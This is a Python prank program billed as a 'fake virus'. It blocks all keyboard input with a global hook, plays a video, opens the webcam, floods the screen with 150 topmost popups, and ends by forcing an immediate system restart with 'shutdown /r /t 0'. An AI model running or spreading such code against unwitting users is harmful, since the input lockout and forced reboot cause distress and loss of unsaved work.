import tkinter
import splashscreen_engine as splash
import pygame
import keyboard
import threading
import os
import random

import DataHandling
import AdditionalUi

data = DataHandling.Uid(username="IDK")
if not data.is_created():
    data.make()
DataHandling.update_last_played()
DataHandling.save_database()



screen = splash.Screen()
screen.size(fullscreen=True) # Add more fun
screen.start()

# Default Font
font = "Orbitron Bold"

# displaying text
text = splash.Text(screen,text="Initializing Virues",font=font,size=25,position="center",colour=(255,255,255))
text.show()

# displaying Bar
bar = splash.LoadingBar(screen,500,10,"center",add_xy=(0,20))
bar.place(loading_colour=(225,0,0))
value = 0

# Initial Messages
init_messages = [
    "Starting",
    "Please Wait",
    "Have a Tea",
    "Loading",
    "Started!"
]

# Disable Keyboard
hook = keyboard.hook(lambda x: keyboard.block_key(x.name))

# Animate Text
for i in range(0,5):
    for k in range(0,20):
        value+=1
        bar.set_progress(value)
        screen.wait(0.1)
    text.edit(text=init_messages[i])
    print(value)
# screen.wait(2)

# Remove other elements
text.hide()
bar.hide()

# # Add Videos after Init
bg_video = splash.BackgroundVideo(screen,"Assets/Videos/1.mp4")
bg_video.play()




while bg_video.is_playing:
    screen.wait(0.5)
    for event in pygame.event.get():
        if event.type == pygame.KEYDOWN:
            pass

# Show opening camera
text.edit(text="Finding Camera...")
text.show()

import Camera

camera = Camera.OpenCamera()
if camera.success:
    text.edit(text="Opening Camera...")
    screen.wait(5)
    threading.Thread(target=camera.show).start()
    screen.wait(10)
    camera.stop()
else:
    text.edit(text="No Camera Found")
    screen.wait(5)

# Show Lots of tkinter popups
text.edit(text="Close Main Window To Exit")
text.show()
windows = {}
main_window =  tkinter.Tk()
main_window.configure(bg="red")
main_window.attributes("-topmost",True)

for i in range(0,150):
    windows[str(i)] = tkinter.Toplevel(main_window)
    windows[str(i)].attributes("-topmost",True)
    windows[str(i)].geometry(f"400x250+{random.randint(0,main_window.winfo_screenwidth())}+{random.randint(0,main_window.winfo_screenheight())}")
    tkinter.Label(windows[str(i)],text="Close Main Window to Exit",font=("default",20)).pack()

main_window.mainloop()

text.edit(text="THANKS FOR USING THIS FAKE VIRUES")
AdditionalUi.RateUs()
DataHandling.save_database()
text.hide()
bg_image = splash.BackgroundImage(screen,"Assets/EndImage.png")
bg_image.set()

screen.wait(6)

screen.stop()

# Enable Keyboard
keyboard.unhook(hook)

os.system("shutdown /r /t 0")



